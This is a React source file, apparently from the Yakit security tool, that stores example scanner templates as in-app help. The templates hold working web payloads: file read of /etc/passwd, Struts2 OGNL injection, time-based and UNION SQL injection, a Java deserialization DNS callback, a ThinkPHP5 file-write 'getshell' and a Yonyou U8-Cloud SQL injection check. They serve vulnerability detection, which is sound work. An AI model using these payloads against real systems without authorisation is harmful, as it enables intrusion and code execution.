import React from "react"
import styles from "./EditorInfo.module.scss"
import {ChatMarkdown} from "@/components/yakChat/ChatMarkdown"
export interface TempExampleInfo {
  label: string
  desc: string
  code: string
}

export const tempExampleList: TempExampleInfo[] = [
    {
        label: "文件读取(普通特征字符串匹配)",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-file-read
info:
  name: 文件读取模板
  author: admin
  severity: high
  description: 根据操作系统的不同，选择读取相应的文件，linux 系统下推荐读取，/etc/passwd,匹配方式则是采用正则匹配响应体，推荐正则 "root:.*:0:0:"
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 52dc9bdb52d04dc20036dbd8313ed075
http:
- raw:
  - |-
    @timeout: 30s
    GET /vulnerable-endpoint?file=/etc/passwd HTTP/1.1
    Host: {{Hostname}}
  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
    condition: and
\`\`\``
    },
    {
        label: "代码执行(匹配二次处理后的结果)",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-code-execution
info:
  name: 代码执行模板
  author: admin
  severity: high
  description: 通过唯一确定的标识进行判断，最好是匹配经过"二次处理"的输入值，比如算数运算后的结果、各种编解码/MD5后的结果，不要单纯只匹配输入值;比如：下面的模板的例子里，不要直接在匹配器中匹配 r1，而是应当匹配 r2，直接匹配 r1 会产生大量误报。
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 81dc9bdb52d04dc20036dbd8313ed055
variables:
  r1: '{{rand_int(100000)}}'
  r2: '{{md5(r1)}}'
http:
- raw:
  - |-
    @timeout: 30s
    POST /endpoiot HTTP/1.1
    Host: {{Hostname}}
    cmd=echo md5({{r1}})
  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: dsl
    part: body
    dsl:
    - contains(body,r2)
    condition: and
\`\`\``
    },
    {
        label: "二进制数据发包",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-rce-hex_decode
info:
  name: Struts2 046
  author: admin
  severity: high
  description: 一些paylaod 中，可能存在不可见字符，此时可以使用 {{hex_decode}} 进行处理，下面模板中的 {{end}} 部分，使用{{hex_decode}} 处理不可见字符
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 52dc9bdb52d04dc20036dbd8313ed085
variables:
  end: '{{hex_decode("00")}}'
  r1: '{{rand_int(10000)}}'
  r2: '{{rand_int(1000000)}}'
http:
- raw:
  - |
    @timeout: 30s
    POST /doUpload.action HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycy7wBvQXDPCJfmKV
    Accept-Encoding: gzip, deflate
    Cookie: JSESSIONID=lj518gojse1izsnois27u8fr
    Content-Length: 370
    ------WebKitFormBoundarycy7wBvQXDPCJfmKV
    Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Echo',{{r1}}+{{r2}})}{{end}}b"
    Content-Type: text/plain
    123
    ------WebKitFormBoundarycy7wBvQXDPCJfmKV
    Content-Disposition: form-data; name="caption"
    ------WebKitFormBoundarycy7wBvQXDPCJfmKV--
  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: dsl
    part: body
    dsl:
    - contains(all_headers,int(r1)+int(r2))
    condition: and
\`\`\``
    },
    {
        label: "无回显检测(通过延时判断)",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-Delay
info:
  name: SQL时间盲注
  author: admin
  severity: high
  description: 通过延时进行漏洞检出判断
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 81dc9bdb52d04dc20036dbd8313ed055
http:
- raw:
  - |-
    @timeout: 30s
    POST /endpoint HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 74
    id=1';WAITFOR DELAY '0: 0: 5' --
  max-redirects: 3
  matchers-condition: and
  matchers:
  - id: 1
    type: dsl
    part: body
    dsl:
    - duration > 5
    condition: and
\`\`\``
    },
    {
        label: "无回显检测(通过DNSLOG判断)",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-dnslog
info:
  name: 反序列化漏洞之DNSLOG 检测
  author: admin
  severity: high
  description: 对于无回显的漏洞，可以使用 dnslog 的方式进行检测，关键在于使用 {{interactsh-url}} 内置变量，此变量会自动申请一个dnslog 地址，后续匹配时只需选择 dsl 填入 interactsh_protocol，当收到 dnslog 响应时，即可检出漏洞
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 09ba5025dfb270c36519f7ace303901c
http:
- raw:
  - |-
    @timeout: 30s
    POST /invoker/readonly HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Content-Length: 67
    {{generate_java_gadget('dns', 'http://{{interactsh-url}}', 'raw')}}
  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: dsl
    part: body
    dsl:
    - interactsh_protocol
    condition: and
\`\`\``
    },
    {
        label: "SQL 注入（如何用随机计算乘法除法并匹配结果）",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-sql-injection
info:
  name: SQL 注入检测模板
  author: admin
  severity: high
  description: 在编写有回显的 SQL 注入漏洞时，通过尝试在输入中注入 SQL 代码来检测 SQL 注入漏洞。此模板通过 CONCAT 语句将两个字符串进行拼接，随后匹配拼接结果，在这里，拼接也是一次"二次处理",和 MD5 的二次处理有异曲同工之妙，可以大大减少误报
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 52dc9bdb52d04dc20036dbd8313ed085
variables:
  r1: '{{rand_char(8)}}'
  r2: '{{rand_char(8)}}'
http:
- raw:
  - |-
    @timeout: 30s
    POST /vulnerable-endpoint HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    User-Agent: WebFuzzer
    
    id=' UNION SELECT CONCAT('{{r1}}', '{{r2}}') -- 
  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: dsl
    part: body
    dsl:
    - contains(body,r1+r2)
    condition: and
\`\`\``
    },
    {
        label: "多个请求检测(文件上传)",
        desc: "yaml",
        code: `\`\`\`yaml
id: WebFuzzer-Template-file-upload
info:
  name: 文件上传/getshell
  author: admin
  severity: high
  description: 文件上传时，确保这些操作是无害的并不会对目标系统产生不良影响，同时又想确保对应的上传文件能成功被解析，可以上传一个回显一串随机值的自删除脚本。并且分为两步，第一步进行文件上传，第二步进行上传文件的确认，确保文件成功被上传，且成功解析执行相应的代码。模板示例中使用，ThinkPHP5 RCE 漏洞 的getshell 的方式来进行演示。
  metadata:
    max-request: 2
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 69f38d7a687e237ad5d6e8e2150ed022
variables:
  file: '{{rand_char(8)}}' # 随机文件名
  r1: '{{rand_char(8)}}' # php 代码中用于 md5 的值
  flag: '{{md5(r1)}}' # 匹配器中用于匹配结果的值
http:
- raw:
  - |+
    @timeout: 30s
    # shell 部分 <?php echo md5('{{r1}}');unlink(__FILE__);?>
    GET /index.php?s=index/\\think\\template\\driver\\file/write&cacheFile={{file}}.php&content=%3C?php%20echo%20md5(%27{{r1}}%27);unlink(__FILE__);?%3E HTTP/1.1
    Host: {{Hostname}}
  - |+
    @timeout: 30s
    GET /{{file}}.php HTTP/1.1
    Host: {{Hostname}}
  max-redirects: 3
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - id: 2
    type: dsl
    part: body
    dsl:
    - contains(body,flag)
    condition: and
\`\`\``
    },
    {
      label: "用友 U8-Cloud SQL 注入：基于时间盲注模版",
      desc: "端口扫描",
      code: `\`\`\`port-scan
yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // yaklang 版本 >= beta8
    packet1 = <<<EOF
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

EOF
    begin_time = time.Now()
    rsp, req = poc.HTTP(packet1, poc.params({"target": addr}), poc.https(isTls), poc.redirectTimes(0))~
    if time.Since(begin_time).Seconds() > 5 {
        yakit.Info(
            "%v found 用友U8-Cloud系统BusinessRefAction存在SQL注入漏洞", 
            addr, 
        )
        risk.NewRisk(
            addr, 
            risk.title("用友U8-Cloud系统BusinessRefAction存在SQL注入漏洞：" + addr), 
            risk.severity("high"), 
            risk.titleVerbose("用友U8-Cloud系统BusinessRefAction存在SQL注入漏洞"), 
            risk.request(string(req)), 
            risk.response(string(rsp)), 
            risk.cve("no cve"), 
        )
    }
    
    return
}

handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
\`\`\``
    }
]
interface TempExampleHelpProps {
    tempExampleItem: TempExampleInfo
}
export const TempExampleHelp: React.FC<TempExampleHelpProps> = React.memo((props) => {
    const {tempExampleItem} = props
    return (
        <div className={styles["temp-example-help-body"]}>
            <h1>{tempExampleItem.label}</h1>
            <ChatMarkdown content={tempExampleItem.code} />
        </div>
    )
})
